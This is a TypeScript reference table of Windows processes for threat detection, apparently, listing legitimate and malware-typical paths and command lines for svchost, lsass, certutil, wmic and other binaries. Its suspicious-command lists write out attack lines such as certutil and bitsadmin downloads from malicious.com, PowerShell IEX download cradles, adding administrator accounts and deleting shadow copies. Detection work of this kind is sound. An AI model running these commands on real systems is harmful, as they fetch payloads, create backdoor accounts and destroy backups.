export interface ProcessInfo {
  name: string
  description: string
  legitimatePaths: string[]
  commonMalwarePaths?: string[]
  notes: string
  category: string
  networkInfo?: {
    ports: string[]
    protocols: string[]
    connections: string[]
  }
  commandLinePatterns?: {
    legitimate: string[]
    suspicious: string[]
  }
  parentProcesses?: {
    legitimate: string[]
    suspicious: string[]
  }
  childProcesses?: {
    common: string[]
    suspicious: string[]
  }
}

export const windowsProcesses: ProcessInfo[] = [
  {
    name: "svchost.exe",
    description: "Service Host Process - hosts Windows services",
    legitimatePaths: ["C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\SysWOW64\\svchost.exe"],
    commonMalwarePaths: ["C:\\Windows\\svchost.exe", "C:\\Users\\*\\AppData\\*\\svchost.exe", "C:\\Temp\\svchost.exe"],
    notes:
      "Legitimate svchost.exe should run from System32 (64-bit) or SysWOW64 (32-bit). Multiple instances are normal.",
    category: "system",
    networkInfo: {
      ports: ["135", "445", "Dynamic RPC"],
      protocols: ["TCP", "UDP", "RPC"],
      connections: ["Local services"],
    },
    commandLinePatterns: {
      legitimate: [
        "svchost.exe -k NetworkService",
        "svchost.exe -k LocalService",
        "svchost.exe -k netsvcs",
        "svchost.exe -k <svcgroup> -p",
      ],
      suspicious: [
        "svchost.exe (no parameters)",
        "svchost.exe -k with unknown groups",
        "svchost.exe from non-system directories",
      ],
    },
  },
  {
    name: "WmiPrvSE.exe",
    description: "WMI Provider Host - executes WMI queries and providers",
    legitimatePaths: [
      "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "C:\\Windows\\SysWOW64\\wbem\\WmiPrvSE.exe"
    ],
    commonMalwarePaths: [
      "C:\\Windows\\WmiPrvSE.exe",
      "C:\\Users\\*\\AppData\\Local\\WmiPrvSE.exe",
      "C:\\Temp\\WmiPrvSE.exe"
    ],
    notes:
      "Legitimate WMI host process. Runs under svchost.exe (WMI service) and should only execute from wbem directories. Attackers frequently abuse WMI for persistence, lateral movement, and remote command execution.",
    category: "system",
    networkInfo: {
      ports: ["135 (DCOM/RPC)", "Dynamic RPC high ports"],
      protocols: ["RPC", "DCOM"],
      connections: ["Local and remote WMI clients"]
    },
    commandLinePatterns: {
      legitimate: [
        "WmiPrvSE.exe"
      ],
      suspicious: [
        "WmiPrvSE.exe from non-wbem paths",
        "WmiPrvSE.exe spawning cmd.exe or powershell.exe",
        "Multiple abnormal instances outside expected parent (svchost.exe)"
      ]
    }
  },
  {
    name: "Ssms.exe",
    description: "SQL Server Management Studio (SSMS) shell",
    legitimatePaths: [
      "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 18\\Common7\\IDE\\Ssms.exe",
      "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 19\\Common7\\IDE\\Ssms.exe",
      "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 20\\Common7\\IDE\\Ssms.exe"
    ],
    commonMalwarePaths: [
      "C:\\Windows\\System32\\Ssms.exe",
      "C:\\Users\\*\\AppData\\Local\\Ssms.exe",
      "C:\\Temp\\Ssms.exe"
    ],
    notes:
      "SSMS IDE host (VS shell). Often spawns SqlToolsService.exe. Attackers sometimes use SSMS for data exfil (query export). Verify signature (Microsoft Corporation).",
    category: "database",
    networkInfo: {
      ports: ["1433 (to SQL Servers)", "1434 (SQL Browser)", "Dynamic client ports"],
      protocols: ["TCP", "TDS"],
      connections: ["SQL Server instances", "Linked servers"]
    },
    commandLinePatterns: {
      legitimate: [
        "Ssms.exe",
        "Ssms.exe -S server -d database -E",
        "Ssms.exe -S server -d database -U user"
      ],
      suspicious: [
        "Ssms.exe exporting large datasets to temp paths",
        "Ssms.exe launched by unusual parents",
        "Ssms.exe with hidden window parameters"
      ]
    }
  },
  {
    name: "explorer.exe",
    description: "Windows Explorer - file manager and desktop shell",
    legitimatePaths: ["C:\\Windows\\explorer.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\explorer.exe", "C:\\Users\\*\\AppData\\*\\explorer.exe"],
    notes:
      "Should run from C:\\Windows\\. Multiple instances can be normal (separate process option, shell extensions).",
    category: "system",
    commandLinePatterns: {
      legitimate: [
        "C:\\Windows\\Explorer.EXE",
        "explorer.exe /n,/e,C:\\folder",
        "explorer.exe /select,C:\\path\\file.txt",
      ],
      suspicious: ["explorer.exe with encoded commands", "explorer.exe /root with suspicious paths"],
    },
  },
  // --- Core Shell & Session Processes ---
{
  name: "sihost.exe",
  description: "Shell Infrastructure Host - manages Start menu, taskbar, UI elements",
  legitimatePaths: ["C:\\Windows\\System32\\sihost.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\sihost.exe"],
  notes: "Critical shell host, runs per user session. Only valid in System32.",
  category: "system",
  commandLinePatterns: { legitimate: ["sihost.exe"], suspicious: ["sihost.exe from non-system32 path"] }
},
{
  name: "ShellExperienceHost.exe",
  description: "Windows Shell Experience Host - handles modern UI elements",
  legitimatePaths: ["C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\ShellExperienceHost.exe"],
  notes: "Should only run from SystemApps folder with Microsoft signature.",
  category: "system",
  commandLinePatterns: { legitimate: ["ShellExperienceHost.exe"], suspicious: ["ShellExperienceHost.exe from temp directories"] }
},
{
  name: "StartMenuExperienceHost.exe",
  description: "Start Menu Experience Host - start menu process",
  legitimatePaths: ["C:\\Windows\\SystemApps\\StartMenuExperienceHost_cw5n1h2txyewy\\StartMenuExperienceHost.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\StartMenuExperienceHost.exe"],
  notes: "Legit only in SystemApps, runs per user session.",
  category: "system",
  commandLinePatterns: { legitimate: ["StartMenuExperienceHost.exe"], suspicious: ["Instances outside SystemApps path"] }
},
{
  name: "SearchApp.exe",
  description: "Windows Search App (Cortana/SearchUI) - search box process",
  legitimatePaths: [
    "C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe",
    "C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe"
  ],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\SearchApp.exe"],
  notes: "Expected as SearchApp.exe (Win10/11) or SearchUI.exe (older). Only in SystemApps.",
  category: "system",
  commandLinePatterns: { legitimate: ["SearchApp.exe"], suspicious: ["SearchApp.exe outside SystemApps"] }
},
{
  name: "SearchProtocolHost.exe",
  description: "Windows Search Protocol Host - indexing helper",
  legitimatePaths: ["C:\\Windows\\System32\\SearchProtocolHost.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\SearchProtocolHost.exe"],
  notes: "Launched by SearchIndexer. Multiple instances normal. Watch for abnormal parents.",
  category: "system",
  commandLinePatterns: { legitimate: ["SearchProtocolHost.exe"], suspicious: ["Spawned by cmd.exe or powershell.exe"] }
},
{
  name: "SearchFilterHost.exe",
  description: "Windows Search Filter Host - indexing helper",
  legitimatePaths: ["C:\\Windows\\System32\\SearchFilterHost.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\SearchFilterHost.exe"],
  notes: "Expected child of SearchIndexer.exe. Only in System32.",
  category: "system",
  commandLinePatterns: { legitimate: ["SearchFilterHost.exe"], suspicious: ["Unexpected parents"] }
},
{
  name: "fontdrvhost.exe",
  description: "User-mode font driver host",
  legitimatePaths: ["C:\\Windows\\System32\\fontdrvhost.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\fontdrvhost.exe"],
  notes: "Runs per logged-in session. Only from System32.",
  category: "system",
  commandLinePatterns: { legitimate: ["fontdrvhost.exe"], suspicious: ["fontdrvhost.exe from non-system32 path"] }
},
{
  name: "LogonUI.exe",
  description: "Logon UI - secure desktop at login and UAC prompts",
  legitimatePaths: ["C:\\Windows\\System32\\LogonUI.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\LogonUI.exe"],
  notes: "Should only appear on secure desktop. Investigate if running in user session.",
  category: "system",
  commandLinePatterns: { legitimate: ["LogonUI.exe"], suspicious: ["Instances in normal desktop session"] }
},
{
  name: "consent.exe",
  description: "UAC Consent UI process",
  legitimatePaths: ["C:\\Windows\\System32\\consent.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\consent.exe"],
  notes: "Runs only when elevation prompts appear. Unexpected execution = suspect.",
  category: "system",
  commandLinePatterns: { legitimate: ["consent.exe"], suspicious: ["consent.exe started without visible UAC"] }
},
{
  name: "WUDFHost.exe",
  description: "Windows Driver Foundation Host - user-mode driver process",
  legitimatePaths: ["C:\\Windows\\System32\\WUDFHost.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\WUDFHost.exe"],
  notes: "Spawns for drivers. Legit only in System32.",
  category: "system",
  commandLinePatterns: { legitimate: ["WUDFHost.exe"], suspicious: ["WUDFHost.exe from non-system32 path"] }
},
{
  name: "lsm.exe",
  description: "Local Session Manager",
  legitimatePaths: ["C:\\Windows\\System32\\lsm.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\lsm.exe"],
  notes: "Present on older Windows builds. Unexpected on modern Windows 10/11.",
  category: "system",
  commandLinePatterns: { legitimate: ["lsm.exe"], suspicious: ["lsm.exe from non-system32 path"] }
},

// --- Windows Update / Servicing / Telemetry / Error Reporting ---
{
  name: "TrustedInstaller.exe",
  description: "Windows Modules Installer service host",
  legitimatePaths: ["C:\\Windows\\servicing\\TrustedInstaller.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\TrustedInstaller.exe"],
  notes: "Runs as SYSTEM, high privilege. Target for abuse. Should only run from servicing folder.",
  category: "system"
},
{
  name: "UsoClient.exe",
  description: "Update Session Orchestrator client",
  legitimatePaths: ["C:\\Windows\\System32\\UsoClient.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\UsoClient.exe"],
  notes: "Manages update checks. Should not be user-launched.",
  category: "system"
},
{
  name: "MoUsoCoreWorker.exe",
  description: "Modern Update Orchestrator Worker",
  legitimatePaths: ["C:\\Windows\\System32\\MoUsoCoreWorker.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\MoUsoCoreWorker.exe"],
  notes: "Windows Update service worker. Runs in background when checking for updates.",
  category: "system"
},
{
  name: "CompatTelRunner.exe",
  description: "Microsoft Compatibility Telemetry Runner",
  legitimatePaths: ["C:\\Windows\\System32\\CompatTelRunner.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\CompatTelRunner.exe"],
  notes: "Telemetry process. Often disabled in enterprises.",
  category: "system"
},
{
  name: "WerFault.exe",
  description: "Windows Error Reporting Fault handler",
  legitimatePaths: ["C:\\Windows\\System32\\WerFault.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\WerFault.exe"],
  notes: "Spawns on application crashes. Frequent crash loops may hide abuse.",
  category: "system"
},
{
  name: "WerMgr.exe",
  description: "Windows Error Reporting Manager",
  legitimatePaths: ["C:\\Windows\\System32\\WerMgr.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\WerMgr.exe"],
  notes: "Background error reporting. Only from System32.",
  category: "system"
},
{
  name: "sppsvc.exe",
  description: "Software Protection Platform Service",
  legitimatePaths: ["C:\\Windows\\System32\\sppsvc.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\sppsvc.exe"],
  notes: "Licensing/activation service. Should not initiate network connections except activation.",
  category: "system"
},

// --- Admin Tools & LOLBins ---
{
  name: "reg.exe",
  description: "Registry Editor CLI",
  legitimatePaths: ["C:\\Windows\\System32\\reg.exe","C:\\Windows\\SysWOW64\\reg.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\reg.exe"],
  notes: "Used for registry modifications. Abuse common in scripts.",
  category: "lolbin"
},
{
  name: "schtasks.exe",
  description: "Task Scheduler CLI",
  legitimatePaths: ["C:\\Windows\\System32\\schtasks.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\schtasks.exe"],
  notes: "Used for persistence and scheduled tasks.",
  category: "lolbin"
},
{
  name: "taskeng.exe",
  description: "Task Scheduler Engine",
  legitimatePaths: ["C:\\Windows\\System32\\taskeng.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\taskeng.exe"],
  notes: "Hosts scheduled task execution. Watch for tasks launching LOLBins.",
  category: "system"
},
{
  name: "netsh.exe",
  description: "Network Shell CLI",
  legitimatePaths: ["C:\\Windows\\System32\\netsh.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\netsh.exe"],
  notes: "Used for firewall, proxy, and port forwarding. Abuse = suspicious.",
  category: "lolbin"
},
{
  name: "ipconfig.exe",
  description: "IP Configuration CLI",
  legitimatePaths: ["C:\\Windows\\System32\\ipconfig.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\ipconfig.exe"],
  notes: "Recon tool. Rare in automated runs.",
  category: "lolbin"
},
{
  name: "tracert.exe",
  description: "Trace Route CLI",
  legitimatePaths: ["C:\\Windows\\System32\\tracert.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\tracert.exe"],
  notes: "Recon tool. Rarely automated.",
  category: "lolbin"
},
{
  name: "route.exe",
  description: "Route CLI utility",
  legitimatePaths: ["C:\\Windows\\System32\\route.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\route.exe"],
  notes: "Can manipulate routing tables. Rarely used legitimately.",
  category: "lolbin"
},
{
  name: "cmstp.exe",
  description: "Connection Manager Profile Installer",
  legitimatePaths: ["C:\\Windows\\System32\\cmstp.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\cmstp.exe"],
  notes: "Abused for UAC bypass and proxy execution.",
  category: "lolbin"
},
{
  name: "installutil.exe",
  description: "Installer Utility (LOLBin)",
  legitimatePaths: ["C:\\Windows\\Microsoft.NET\\Framework\\*\\installutil.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\installutil.exe"],
  notes: "Part of .NET framework. Executes assemblies. Abused for code exec.",
  category: "lolbin"
},
{
  name: "regsvcs.exe",
  description: "Microsoft .NET Services Registration Utility",
  legitimatePaths: ["C:\\Windows\\Microsoft.NET\\Framework\\*\\regsvcs.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\regsvcs.exe"],
  notes: "Abused for code execution. Rarely used legitimately.",
  category: "lolbin"
},
{
  name: "regasm.exe",
  description: "Assembly Registration Tool",
  legitimatePaths: ["C:\\Windows\\Microsoft.NET\\Framework\\*\\regasm.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\regasm.exe"],
  notes: "Registers .NET assemblies. Can be abused.",
  category: "lolbin"
},
{
  name: "msbuild.exe",
  description: "MSBuild (Build Tool, LOLBin)",
  legitimatePaths: ["C:\\Windows\\Microsoft.NET\\Framework\\*\\msbuild.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\msbuild.exe"],
  notes: "Compiles and runs XML project files. Attackers embed payloads.",
  category: "lolbin"
},
{
  name: "xwizard.exe",
  description: "Extensible Wizard Host",
  legitimatePaths: ["C:\\Windows\\System32\\xwizard.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\xwizard.exe"],
  notes: "LOLBin abused for COM script execution.",
  category: "lolbin"
},
{
  name: "fodhelper.exe",
  description: "Features On Demand Helper",
  legitimatePaths: ["C:\\Windows\\System32\\fodhelper.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\fodhelper.exe"],
  notes: "Known UAC bypass binary. Rare legitimate use.",
  category: "lolbin"
},
{
  name: "msdt.exe",
  description: "Microsoft Support Diagnostic Tool",
  legitimatePaths: ["C:\\Windows\\System32\\msdt.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\msdt.exe"],
  notes: "Deprecated but still present on many systems. Used in Follina exploit.",
  category: "lolbin"
},
{
  name: "PSEXESVC.exe",
  description: "PsExec Service binary (Sysinternals)",
  legitimatePaths: ["C:\\Windows\\PSEXESVC.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\PSEXESVC.exe"],
  notes: "Appears during PsExec remote execution. Should be investigated in enterprise.",
  category: "remote"
},
  {
    name: "winlogon.exe",
    description: "Windows Logon Process - handles user authentication",
    legitimatePaths: ["C:\\Windows\\System32\\winlogon.exe"],
    commonMalwarePaths: ["C:\\Windows\\winlogon.exe", "C:\\Users\\*\\winlogon.exe"],
    notes: "Critical system process. Should only run from System32 with SYSTEM privileges.",
    category: "security",
    commandLinePatterns: {
      legitimate: ["winlogon.exe"],
      suspicious: ["winlogon.exe with any parameters", "Multiple winlogon.exe instances"],
    },
  },
  {
    name: "lsass.exe",
    description: "Local Security Authority Subsystem Service",
    legitimatePaths: ["C:\\Windows\\System32\\lsass.exe"],
    commonMalwarePaths: ["C:\\Windows\\lsass.exe", "C:\\Users\\*\\lsass.exe", "C:\\Temp\\lsass.exe"],
    notes: "Handles security policies and user authentication. Frequently targeted by malware.",
    category: "security",
    networkInfo: {
      ports: ["389 (LDAP)", "636 (LDAPS)", "88 (Kerberos)", "135 (RPC)"],
      protocols: ["TCP", "UDP", "LDAP", "Kerberos", "NTLM"],
      connections: ["Domain controllers", "Authentication services", "Security providers"],
    },
    commandLinePatterns: {
      legitimate: ["C:\\Windows\\system32\\lsass.exe"],
      suspicious: ["lsass.exe with parameters", "lsass.exe from non-system32 location"],
    },
  },
  {
    name: "csrss.exe",
    description: "Client/Server Runtime Subsystem",
    legitimatePaths: ["C:\\Windows\\System32\\csrss.exe"],
    commonMalwarePaths: ["C:\\Windows\\csrss.exe", "C:\\Users\\*\\csrss.exe"],
    notes: "Critical. Usually at least two instances (session 0 + user sessions). Only from System32.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["csrss.exe ObjectDirectory=\\Windows"],
      suspicious: ["csrss.exe without ObjectDirectory", "csrss.exe from non-system32 location"],
    },
  },
  {
    name: "chrome.exe",
    description: "Google Chrome Browser",
    legitimatePaths: [
      "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
    ],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\chrome.exe", "C:\\Windows\\chrome.exe"],
    notes: "Multiple instances are normal. Check digital signature if found in unusual locations.",
    category: "browsers",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)", "Various high ports"],
      protocols: ["TCP", "HTTP", "HTTPS", "WebRTC"],
      connections: ["Web servers", "DNS servers", "CDN networks"],
    },
    commandLinePatterns: {
      legitimate: ["chrome.exe --type=renderer", "chrome.exe --type=gpu-process", "chrome.exe --user-data-dir=..."],
      suspicious: [
        "chrome.exe --disable-security-features",
        "chrome.exe --allow-running-insecure-content",
        "chrome.exe with suspicious URLs",
      ],
    },
  },
  {
    name: "powershell.exe",
    description: "Windows PowerShell",
    legitimatePaths: [
      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
    ],
    commonMalwarePaths: ["C:\\Windows\\powershell.exe", "C:\\Users\\*\\powershell.exe"],
    notes: "Powerful scripting tool. Monitor command line arguments for suspicious activity.",
    category: "scripting",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)", "5985 (WinRM)", "5986 (WinRM-HTTPS)"],
      protocols: ["TCP", "HTTP", "HTTPS", "WinRM"],
      connections: ["Remote systems", "Web services", "PowerShell remoting"],
    },
    commandLinePatterns: {
      legitimate: ["powershell.exe -ExecutionPolicy Bypass -File script.ps1", "powershell.exe -Command Get-Process"],
      suspicious: [
        "powershell.exe -EncodedCommand [base64]",
        "powershell.exe -WindowStyle Hidden",
        "powershell.exe IEX (New-Object Net.WebClient).DownloadString",
        "powershell.exe -ep bypass -w hidden",
      ],
    },
  },
  {
    name: "cmd.exe",
    description: "Windows Command Processor",
    legitimatePaths: ["C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\SysWOW64\\cmd.exe"],
    commonMalwarePaths: ["C:\\Windows\\cmd.exe", "C:\\Users\\*\\cmd.exe", "C:\\Temp\\cmd.exe"],
    notes: "Command line interface. Monitor for suspicious command line arguments and parent processes.",
    category: "scripting",
    commandLinePatterns: {
      legitimate: ["cmd.exe /c dir", "cmd.exe /k echo off"],
      suspicious: [
        "cmd.exe /c powershell -enc [base64]",
        "cmd.exe /c certutil -urlcache -split -f http://",
        "cmd.exe /c bitsadmin /transfer",
        "cmd.exe /c echo [encoded] | certutil -decode",
      ],
    },
  },
  {
    name: "sqlservr.exe",
    description: "Microsoft SQL Server Database Engine",
    legitimatePaths: [
      "C:\\Program Files\\Microsoft SQL Server\\*\\MSSQL\\Binn\\sqlservr.exe",
      "C:\\Program Files (x86)\\Microsoft SQL Server\\*\\MSSQL\\Binn\\sqlservr.exe",
    ],
    commonMalwarePaths: ["C:\\Windows\\System32\\sqlservr.exe", "C:\\Users\\*\\sqlservr.exe", "C:\\Temp\\sqlservr.exe"],
    notes:
      "SQL Server database engine. Should only run from SQL Server installation directory. Monitor for unauthorized instances.",
    category: "database",
    networkInfo: {
      ports: ["1433 (SQL Server)", "1434 (SQL Browser)", "Dynamic ports"],
      protocols: ["TCP", "UDP", "TDS (Tabular Data Stream)"],
      connections: ["Client applications", "Linked servers", "Replication partners"],
    },
    commandLinePatterns: {
      legitimate: ["sqlservr.exe -s MSSQLSERVER", "sqlservr.exe -s INSTANCENAME"],
      suspicious: ["sqlservr.exe from non-SQL Server directory", "sqlservr.exe with unusual instance names"],
    },
  },
  {
    name: "mstsc.exe",
    description: "Remote Desktop Connection Client",
    legitimatePaths: ["C:\\Windows\\System32\\mstsc.exe"],
    commonMalwarePaths: ["C:\\Windows\\mstsc.exe", "C:\\Users\\*\\mstsc.exe", "C:\\Temp\\mstsc.exe"],
    notes: "Remote Desktop Protocol client. Monitor for unauthorized remote connections and lateral movement.",
    category: "remote",
    networkInfo: {
      ports: ["3389 (RDP)", "Custom RDP ports"],
      protocols: ["TCP", "RDP"],
      connections: ["Remote Windows systems", "Terminal servers"],
    },
    commandLinePatterns: {
      legitimate: ["mstsc.exe /v:server.domain.com", "mstsc.exe /f /v:192.168.1.100"],
      suspicious: [
        "mstsc.exe /v: with suspicious IPs",
        "mstsc.exe with credential parameters",
        "mstsc.exe /admin to production servers",
      ],
    },
  },
  {
    name: "rdpclip.exe",
    description: "RDP Clipboard Monitor",
    legitimatePaths: ["C:\\Windows\\System32\\rdpclip.exe"],
    commonMalwarePaths: ["C:\\Windows\\rdpclip.exe", "C:\\Users\\*\\rdpclip.exe"],
    notes: "RDP clipboard sharing service. Runs during active RDP sessions. Should only exist during remote sessions.",
    category: "remote",
    networkInfo: {
      ports: ["3389 (RDP)", "Dynamic ports for clipboard"],
      protocols: ["TCP", "RDP"],
      connections: ["RDP session host", "Clipboard data transfer"],
    },
    commandLinePatterns: {
      legitimate: ["rdpclip.exe"],
      suspicious: ["rdpclip.exe with parameters", "rdpclip.exe running without active RDP session"],
    },
  },
  {
    name: "net.exe",
    description: "Network Command Tool",
    legitimatePaths: ["C:\\Windows\\System32\\net.exe"],
    commonMalwarePaths: ["C:\\Windows\\net.exe", "C:\\Users\\*\\net.exe"],
    notes: "Network administration tool. Monitor for lateral movement and reconnaissance activities.",
    category: "network",
    networkInfo: {
      ports: ["135 (RPC)", "445 (SMB)", "139 (NetBIOS)"],
      protocols: ["TCP", "SMB", "NetBIOS", "RPC"],
      connections: ["Domain controllers", "Network shares", "Remote systems"],
    },
    commandLinePatterns: {
      legitimate: ["net use Z: \\\\server\\share", "net user username /domain"],
      suspicious: [
        "net user administrator /add",
        "net localgroup administrators user /add",
        "net share C$=C:\\ /grant:everyone,full",
        "net view /domain",
      ],
    },
  },
  {
    name: "ping.exe",
    description: "Ping Network Utility",
    legitimatePaths: ["C:\\Windows\\System32\\ping.exe"],
    commonMalwarePaths: ["C:\\Windows\\ping.exe", "C:\\Users\\*\\ping.exe"],
    notes: "Network connectivity testing tool. Can be used for network reconnaissance.",
    category: "network",
    networkInfo: {
      ports: ["ICMP (no port)"],
      protocols: ["ICMP"],
      connections: ["Target hosts", "Network infrastructure"],
    },
    commandLinePatterns: {
      legitimate: ["ping google.com", "ping -t 192.168.1.1"],
      suspicious: [
        "ping with large packet sizes",
        "ping to internal network ranges during reconnaissance",
        "ping -l 65500 (large packet size)",
      ],
    },
  },
  {
    name: "nslookup.exe",
    description: "DNS Lookup Tool",
    legitimatePaths: ["C:\\Windows\\System32\\nslookup.exe"],
    commonMalwarePaths: ["C:\\Windows\\nslookup.exe", "C:\\Users\\*\\nslookup.exe"],
    notes: "DNS query tool. Often used in reconnaissance and DNS tunneling attacks.",
    category: "network",
    networkInfo: {
      ports: ["53 (DNS)"],
      protocols: ["UDP", "TCP", "DNS"],
      connections: ["DNS servers", "Authoritative name servers"],
    },
    commandLinePatterns: {
      legitimate: ["nslookup google.com", "nslookup -type=MX domain.com"],
      suspicious: [
        "nslookup -type=TXT with suspicious domains",
        "nslookup queries to known malicious domains",
        "nslookup with base64 encoded queries",
      ],
    },
  },
  {
    name: "netstat.exe",
    description: "Network Statistics Tool",
    legitimatePaths: ["C:\\Windows\\System32\\netstat.exe"],
    commonMalwarePaths: ["C:\\Windows\\netstat.exe", "C:\\Users\\*\\netstat.exe"],
    notes: "Network connection monitoring tool. Used for network analysis and troubleshooting.",
    category: "network",
    commandLinePatterns: {
      legitimate: ["netstat -an", "netstat -b", "netstat -r"],
      suspicious: [
        "netstat -an | findstr LISTEN (reconnaissance)",
        "netstat output redirected to files for exfiltration",
      ],
    },
  },
  {
    name: "certutil.exe",
    description: "Certificate Services Utility",
    legitimatePaths: ["C:\\Windows\\System32\\certutil.exe"],
    commonMalwarePaths: ["C:\\Windows\\certutil.exe", "C:\\Users\\*\\certutil.exe"],
    notes: "Certificate management tool. Frequently abused for file downloads and encoding.",
    category: "admin",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Certificate authorities", "Web servers", "Download sources"],
    },
    commandLinePatterns: {
      legitimate: ["certutil -store my", "certutil -verify certificate.cer"],
      suspicious: [
        "certutil -urlcache -split -f http://malicious.com/file.exe",
        "certutil -encode file.exe encoded.txt",
        "certutil -decode encoded.txt file.exe",
        "certutil -ping malicious.com",
      ],
    },
  },
  {
    name: "bitsadmin.exe",
    description: "Background Intelligent Transfer Service Admin",
    legitimatePaths: ["C:\\Windows\\System32\\bitsadmin.exe"],
    commonMalwarePaths: ["C:\\Windows\\bitsadmin.exe", "C:\\Users\\*\\bitsadmin.exe"],
    notes: "BITS administration tool. Often abused for malware download and persistence.",
    category: "admin",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Download sources", "Web servers"],
    },
    commandLinePatterns: {
      legitimate: ["bitsadmin /list /allusers", "bitsadmin /info jobname"],
      suspicious: [
        "bitsadmin /transfer job http://malicious.com/file.exe C:\\temp\\file.exe",
        "bitsadmin /create /download jobname",
        "bitsadmin /addfile with suspicious URLs",
      ],
    },
  },
  {
    name: "wmic.exe",
    description: "Windows Management Instrumentation Command",
    legitimatePaths: ["C:\\Windows\\System32\\wbem\\wmic.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\wbem\\wmic.exe", "C:\\Users\\*\\wmic.exe"],
    notes: "WMI command-line tool. Frequently used by attackers for system reconnaissance.",
    category: "admin",
    networkInfo: {
      ports: ["135 (RPC)", "Dynamic RPC ports"],
      protocols: ["TCP", "RPC", "DCOM"],
      connections: ["Remote WMI providers", "Domain controllers"],
    },
    commandLinePatterns: {
      legitimate: ["wmic process list", "wmic service get name,state"],
      suspicious: [
        'wmic process call create "cmd.exe"',
        "wmic /node:remote-pc process call create",
        "wmic useraccount get /ALL",
        "wmic shadowcopy delete /nointeractive",
      ],
    },
  },
  {
    name: "notepad.exe",
    description: "Windows Notepad text editor",
    legitimatePaths: ["C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\notepad.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\*\\notepad.exe", "C:\\Temp\\notepad.exe"],
    notes: "Simple text editor. Malware sometimes uses this name to appear legitimate.",
    category: "system",
  },
  {
    name: "taskmgr.exe",
    description: "Windows Task Manager",
    legitimatePaths: ["C:\\Windows\\System32\\taskmgr.exe"],
    commonMalwarePaths: ["C:\\Windows\\taskmgr.exe", "C:\\Users\\*\\taskmgr.exe"],
    notes: "System monitoring tool. Should only run from System32.",
    category: "admin",
  },
  {
    name: "rundll32.exe",
    description: "Run DLL as Application - executes DLL functions",
    legitimatePaths: ["C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\SysWOW64\\rundll32.exe"],
    commonMalwarePaths: ["C:\\Windows\\rundll32.exe", "C:\\Users\\*\\rundll32.exe"],
    notes: "Legitimate but often abused by malware. Check command line arguments and parent process.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["rundll32.exe shell32.dll,Control_RunDLL", "rundll32.exe user32.dll,LockWorkStation"],
      suspicious: [
        "rundll32.exe with suspicious DLL paths",
        "rundll32.exe javascript:eval(...)",
        "rundll32.exe with encoded parameters",
      ],
    },
  },
  {
    name: "dwm.exe",
    description: "Desktop Window Manager - visual composition",
    legitimatePaths: ["C:\\Windows\\System32\\dwm.exe"],
